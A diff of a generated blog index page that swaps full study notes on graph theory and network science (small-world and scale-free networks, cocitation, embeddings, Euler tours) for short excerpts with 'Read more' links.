-<p>$\bar d(u) \approx \frac{(n-1)(n+k-1)}{2kn} $</p>
-<p>WS(n, k, 0) may show a high clustering coefficient, yet it has large average shortest path lengths.</p>
-<p>However, if we slightly increase p, the average path length and cc drops rapidly.</p>
-<h2 id="Small-World-Networks"><a href="#Small-World-Networks" class="headerlink" title="Small World Networks"></a>Small World Networks</h2><p>In many real-world situations, the average shortest path length is relatively small.</p>
-<p>Small world networks show properties of ER random graphs, however they differ in terms of their clustering coefficient and average shortest path length.</p>
-<p>Watts-Strogatz random graphs are generally considered to represent small-world phenomenon. However, WS random graphs often do not capture (other) properties of real-world networks, such as communication networks or biological networks.</p>
-<h2 id="Scale-free-Networks"><a href="#Scale-free-Networks" class="headerlink" title="Scale-free Networks"></a>Scale-free Networks</h2><p>A network is called scale-free if the distribution of vertex degrees follows a power law, which means that the probability that an arbitrary node has degree k is proportional to $(1/k)^α$ for some number α &gt; 1 (called the scaling exponent).</p>
-<p>Typical values for α are in the range $2 ≤ α ≤ 3$.</p>
-<h1 id="Social-Network-Analysis"><a href="#Social-Network-Analysis" class="headerlink" title="Social Network Analysis"></a>Social Network Analysis</h1><p>When analyzing the relationships between pairs (dyads) of social entities, we can derive secondary relationships.</p>
-<p>dyad <code>[&#39;daɪæd]</code> n.  一对</p>
-<p>dyadic <code>[daɪ&#39;ædɪk]</code> a.</p>
-<h2 id="Cocitation"><a href="#Cocitation" class="headerlink" title="Cocitation"></a>Cocitation</h2><p>The cocitation $C_{ij}$ of two vertices i and j in a directed network is the number of vertices that have outgoing edges pointing to both i and j:</p>
-<p>$C_{ij}=\sum_{k=1}^n A_{ik}A_{jk}= \sum_{k=1}^n A_{ik}A^T_{kj}$</p>
-<p>后面是矩阵乘法定义。</p>
-<p>cocitation matrix $C=AA^T$, C is symmetric.</p>
-<h2 id="Bibliographic-Coupling"><a href="#Bibliographic-Coupling" class="headerlink" title="Bibliographic Coupling"></a>Bibliographic Coupling</h2><p><code>[,bɪblɪə&#39;ɡræfɪk]</code></p>
-<p>The bibliographic coupling $B_{ij}$ of two vertices i and j in a directed network is the number of other vertices to which both point:</p>
-<p>$B_{ij}=\sum_{k=1}^n A_{ki}A_{kj}= \sum_{k=1}^n A^T_{ik}A_{kj}$</p>
-<p>bibliographic coupling matrix $B=A^TA$.</p>
-
-          
+          <p><strong>Recommender Systems</strong></p>
+<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>A recommender system aims at <em>predicting</em> the rating or preference that a <em>user</em> would<br>give to an <em>item</em> that she has not yet considered.<br><strong><em>Goals</em></strong>: relevant, novel, serendipity, diverse.<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/02/19/Digital Communities Notes P2/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1467,110 +670,14 @@
 
       
         
-          
-            <h1 id="Foundations-of-Graph-Theory"><a href="#Foundations-of-Graph-Theory" class="headerlink" title="Foundations of Graph Theory"></a>Foundations of Graph Theory</h1><h2 id="Graphs-Vertices-and-Edges"><a href="#Graphs-Vertices-and-Edges" class="headerlink" title="Graphs, Vertices and Edges"></a>Graphs, Vertices and Edges</h2><p>Graph $G = (V, E)$, Set of vertices $V(G)$, Set of edges $E(G)$.</p>
-<blockquote>
-<p>Each edge $e\in E$ is said to <strong>join</strong> two vertices, which are called its <strong>end points</strong>.</p>
-<p>I If $e$ joins $u, v∈V$, we write $e = <u, v="">$. Vertex $u$ and $v$ in this case are said to be <strong>adjacent</strong>. Edge e is said to be <strong>incident </strong>with vertices $u$ and $v$, respectively.</u,></p>
-</blockquote>
-<h2 id="Loops-and-Multiple-Edges"><a href="#Loops-and-Multiple-Edges" class="headerlink" title="Loops and Multiple Edges"></a>Loops and Multiple Edges</h2><p>Loop (self-edge)  </p>
-<p>Multiple edges (multi-edge)</p>
-<blockquote>
-<p>A graph that does not have loops or multiple edges is called <strong>simple</strong>.</p>
-</blockquote>
-<h2 id="Complete-Graphs"><a href="#Complete-Graphs" class="headerlink" title="Complete Graphs"></a>Complete Graphs</h2><blockquote>
-<p>A simple graph having n vertices, with each vertex being adjacent to every other vertex is called a <strong>complete graph</strong> $K_n$.</p>
-</blockquote>
-<h2 id="Degree"><a href="#Degree" class="headerlink" title="Degree"></a>Degree</h2><blockquote>
-<p>The number of edges incident with a vertex $v ∈ V$ is called the <strong>degree </strong>of $v$, denoted as $δ(v)$.</p>
-<p>The <strong>maximal degree </strong>of a vertex in graph $G$ is denoted as $\Delta(G)$.</p>
-</blockquote>
-<p>For any graph, the number of vertices with odd degree is even.</p>
-<h2 id="Adjacency-matrix-of-a-Graph"><a href="#Adjacency-matrix-of-a-Graph" class="headerlink" title="Adjacency matrix of a Graph"></a>Adjacency matrix of a Graph</h2><p>$$A_{ij} = \begin{cases} 1, &amp; \text{an edge between vertices $i$ and $j$} \ 0, &amp; \text{otherwise} \end{cases}$$</p>
-<h2 id="Directed-Graphs"><a href="#Directed-Graphs" class="headerlink" title="Directed Graphs"></a>Directed Graphs</h2><p>Digraph $D = (V , A)$, set of vertices $V$ and set of arcs $A$.</p>
-<p>arc $a = <u,v>$ is said to join vertex $u ∈ V$ to another vertex $v\in V$.</u,v></p>
-<p>Vertex $u$ is called the <strong>tail</strong> of $a$, whereas $v$ is its <strong>head</strong>.</p>
-<p>Number of arcs with head <em>v</em> : in-degree $δ_{in}(v)$.</p>
-<p>Number of arcs with tail <em>v</em> : out-degree $δ_{out}(v)$.</p>
-<p>$$A_{ij} = \begin{cases} 1, &amp; \text{an arc that joins $j$ to $i$} \ 0, &amp; \text{otherwise} \end{cases}$$</p>
-<h2 id="Walks-Trails-Paths-and-Cycles"><a href="#Walks-Trails-Paths-and-Cycles" class="headerlink" title="Walks, Trails, Paths, and Cycles"></a>Walks, Trails, Paths, and Cycles</h2><p>A $(v0, vk)-walk$ in G is an alternating sequence $[v0, e1, v1, e2, . . . vk−1, ek, vk]$ of vertices and edges from G with $e_i = <v_{i−1}, v_i="">.$</v_{i−1},></p>
-<p>A <strong>trail </strong>is a <em>walk</em> in which all <em>edges are distinct</em>.</p>
-<p>A <strong>path </strong>is a <em>trail</em> in which all <em>vertices are distinct</em>.</p>
-<p>A <strong>cycle </strong>is a closed trail in which all vertices excepts $v_0$ and $v_k$ are distinct.</p>
-<p>A simple, connected graph having no cycles is called a <strong>tree </strong>(also called <strong>acyclic</strong><br><strong>graph</strong>).</p>
-<h2 id="Connectedness-and-Components"><a href="#Connectedness-and-Components" class="headerlink" title="Connectedness and Components"></a>Connectedness and Components</h2><p>A graph $H$ is a <strong>subgraph</strong> of $G$ if $V(H) ⊆ V(G)$ and $E(H) ⊆ E(G)$ such that for all<br>$e ∈ E(H)$ with $e = &lt; u, v &gt;$ we have that $u, v ∈ V(H)$.</p>
-<p>A subgraph $H$ of $G$ is called a <strong>component</strong> of $G$ if $H$ is <em>connected</em> and <em>not contained</em> in a connected subgraph of $G$ with more vertices or edges.</p>
-<p>The number of components of G is denoted as $ω(G)$.</p>
-<p>The adjacency matrix of a network with more than one component can be written in <em>block diagonal form</em>.</p>
-<h2 id="Vertex-Eccentricity-Graph-Radius-and-Diameter"><a href="#Vertex-Eccentricity-Graph-Radius-and-Diameter" class="headerlink" title="Vertex Eccentricity, Graph Radius and Diameter"></a>Vertex Eccentricity, Graph Radius and Diameter</h2><p>Eccentricity <code>[,eksen&#39;trɪsɪtɪ]</code></p>
-<p>The <strong>(geodesic) distance</strong> between $u$ and $v$, denoted as $d(u, v)$, is the length of a<br>shortest $(u, v)-path$.</p>
-<p>The <strong>eccentricity</strong> $\epsilon (u)$ of a vertex $u$ in $G$ is defined as $max\{d(u, v)|v ∈ V(G)\}$.</p>
-<p>The <strong>radius</strong> of $G$, denoted as $rad(G)$, is equal to $min\{\epsilon (u)|u ∈ V(G)\}$.</p>
-<p>The <strong>diameter</strong> of $G$, denoted as $diam(G)$, is the maximal shortest path between any two vertices: $diam(G) := max\{d(u, v)|u, v ∈ V(G)\}$.</p>
-<p>The eccentricity of a vertex $u$ tells us <em>how far the farthest vertex from $u$</em> is positioned in the network.</p>
-<p>The radius of a network is an indication of how <em>disparate</em> the vertices in a network actually are.</p>
-<p>disparate <code>[&#39;dɪsp(ə)rət]</code> <code>a.</code> clearly different from each other in quality or type.</p>
-<h2 id="Clique-Clan-and-Core"><a href="#Clique-Clan-and-Core" class="headerlink" title="Clique, Clan and Core"></a>Clique, Clan and Core</h2><p>undirected simple graph G. </p>
-<p>A <strong>(maximal) clique</strong> of $G$ is a <em>maximal complete</em> subgraph $H$ of at least three vertices. A clique with $k$ vertices is called a $k-clique$.</p>
-<p>A <strong>k-distance-clique</strong> of $G$ is a <em>maximal</em> subgraph H of G such that for all vertices $u, v ∈ V(H)$, the distance $d_G(u, v) ≤ k$.</p>
-<p>A <strong>k-clan</strong> of $G$ is a <em>k-distance-clique H</em> of G such that for all vertices $u, v∈V(H)$, the distance $d_H(u, v) ≤ k$.</p>
-<p>A <strong>k-core</strong> of G is a <em>maximal</em> subgraph H of G such that for all vertices $u∈V(H)$, the degree $δ(u) ≥ k$.</p>
-<h2 id="Regular-Graphs"><a href="#Regular-Graphs" class="headerlink" title="Regular Graphs"></a>Regular Graphs</h2><blockquote>
-<p>If every vertex has the same degree, the graph is called <strong>regular</strong>.</p>
-</blockquote>
-<h2 id="Vertex-Cuts-and-Edge-Cuts"><a href="#Vertex-Cuts-and-Edge-Cuts" class="headerlink" title="Vertex Cuts and Edge Cuts"></a>Vertex Cuts and Edge Cuts</h2><p>割点集合和割边集合</p>
-<p>The size of a <em>minimal vertex cut</em> for graph G is denoted as $\kappa(G)$.</p>
-<p>The size of a <em>minimal edge cut</em> for graph G is denoted as$ λ(G)$.</p>
-<p>$κ(G) ≤ λ(G) ≤ min\{δ(v)|v ∈ V(G)\}$</p>
-<p>A graph G is k-connected if $κ(G) ≥ k$.</p>
-<p>G is k-edge-connected if $λ(G) ≥ k$. </p>
-<p>G is optimally connected if $κ(G) = λ(G) = min\{δ(v)|v ∈ V(G)\}$.</p>
-<h2 id="Graph-Isomorphism"><a href="#Graph-Isomorphism" class="headerlink" title="Graph Isomorphism"></a>Graph Isomorphism</h2><p>isomorphism <code>[,aɪsəʊ&#39;mɔːfɪzəm]</code> 同形性, 同态性</p>
-<p>$G$ and $G^∗$ are <strong>isomorphic</strong> if there exists a one-to-one mapping $φ : V → V^∗$ such that for every edge $e ∈ E$ with $e = <u, v="">$, there is a <em>unique</em> edge $e^∗ ∈ E^∗$ with $e^∗ = &lt;φ(u), φ(v)&gt;.$</u,></p>
-<p>$φ$是点的映射，边是一对一对应。</p>
-<p>Necessary conditions: same degree sequence</p>
-<p>In general, graph isomorphism plays an important role in complexity theory. It is in NP, but it is not known to be in P and it is not known to be NP-complete.</p>
-<p>Put simply, for a given graph $G$ it is computationally <strong>easy</strong> to create an isomorphic graph $G^∗$. However, for two given graphs $G$ and $G^<em>$ it is computationally <em>*hard</em></em> to reconstruct an isomorphic mapping function $φ$.</p>
-<h1 id="Graph-Embedding"><a href="#Graph-Embedding" class="headerlink" title="Graph Embedding"></a>Graph Embedding</h1><p>visualization of a graph</p>
-<blockquote>
-<p>A <strong>graph embedding</strong> is a representation of a graph on a surface where every vertex is mapped to a particular position on the surface.</p>
-</blockquote>
-<h2 id="Circular-Embedding"><a href="#Circular-Embedding" class="headerlink" title="Circular Embedding"></a>Circular Embedding</h2><p>Place vertices at evenly spaced points on a surface.</p>
-<p>A circular embedding is particularly <em>useful</em> if one wants to <em>see all edges</em>.</p>
-<p>Because no three vertices ever lie on the same line, this allows every edge to stay (reasonably) visible.</p>
-<h2 id="Spring-Embedding"><a href="#Spring-Embedding" class="headerlink" title="Spring Embedding"></a>Spring Embedding</h2><p>The spring embedding was proposed by Eades in 1984. </p>
-<p>Attracting force $F_{att}(u, v)$ between the vertices u and v it joins as follows:</p>
-<p>$$F_{att}(u, v)\stackrel{def}=  \begin{cases} 2log(d(u,v)) &amp; \text{if u and v are adjacent} \\0 &amp; \text{otherwise} \end{cases}$$</p>
-<p>吸引力F随着距离增加按log增长。</p>
-<p>Repelling force $F_{rep}(u, v)$ is defined as:</p>
-<p>$$F_{rep}(u, v)\stackrel{def}=  \begin{cases} 0 &amp; \text{if u and v are adjacent} \\1/\sqrt{(d(u,v))} &amp; \text{otherwise} \end{cases}$$</p>
-<p>随着距离增加，力按根号倒数速度衰减。</p>
-<p>Algorithm:</p>
-<ol>
-<li><p>Place all vertices randomly.</p>
-</li>
-<li><p>For each vertex $u$ calculate the current forces in the $x$ and $y$ direction, respectively:</p>
-<p>$F_x(u)\stackrel{def}=\sum_{v\neq u}(F_{att,x}(u,v)-F_{rep,x}(u,v)) $</p>
-<p>$F_y(u)\stackrel{def}=\sum_{v\neq u} (F_{att,y}(u,v)-F_{rep,y}(u,v)) $</p>
-</li>
-<li><p>Reposition vertex u according to:<br>$u_x = u_x + 0.1<em>F_x(u)$  and  $u_y = u_y + 0.1</em>F_y(u)$</p>
-</li>
-<li><p>Goto step 2. Stop after M iterations.</p>
-<p>Here, $F_x(u,v)=F(u,v)* \frac{|v_x-u_x|}{d(u,v)} $</p>
-</li>
-</ol>
-<p>每个点，有来自数量等于度的相邻结点的吸引力，和与其他所有不相邻的点的排斥力。力是根据二维平面距离计算的，但是计算坐标时是投影到x轴和y轴进行计算的。</p>
-<h2 id="Planar-Graphs"><a href="#Planar-Graphs" class="headerlink" title="Planar Graphs"></a>Planar Graphs</h2><p><code>[&#39;pleɪnə]</code></p>
-<blockquote>
-<p>A <strong>plane graph</strong> is a specific embedding of a graph G such that no two edges <em>intersect</em>. If such an embedding exists, G is said to be <em>planar</em>.</p>
-</blockquote>
-<p>When considering a plane graph, we will observe a number of <strong>regions</strong> (also called<br><strong>faces</strong>), which are enclosed by the edges of the graph. Each region is enclosed by a cycle.</p>
-<p>Euler’s formula: For a plane graph G with n vertices, m edges, and r regions, we<br>have that $n − m + r = 2$.</p>
-<h2 id="Euler-tour"><a href="#Euler-tour" class="headerlink" title="Euler tour"></a>Euler tour</h2><p>A <strong>tour</strong> of a graph G is a <strong>(u, v)- closed walk</strong> that traverses <em>each edge</em> in G.</p>
-<p>An <strong>Euler tour</strong> is a tour in which all edges are traversed <em>exactly once</em>.</p>
-<p>A connected graph G has an Euler tour if and only if <strong><em>it has no vertices of odd degree</em></strong>.</p>
-
-          
+          <h1 id="Foundations-of-Graph-Theory"><a href="#Foundations-of-Graph-Theory" class="headerlink" title="Foundations of Graph Theory"></a>Foundations of Graph Theory</h1><h2 id="Graphs-Vertices-and-Edges"><a href="#Graphs-Vertices-and-Edges" class="headerlink" title="Graphs, Vertices and Edges"></a>Graphs, Vertices and Edges</h2><p>Graph $G = (V, E)$, Set of vertices $V(G)$, Set of edges $E(G)$.<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/02/17/Digital Communities Notes P1/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
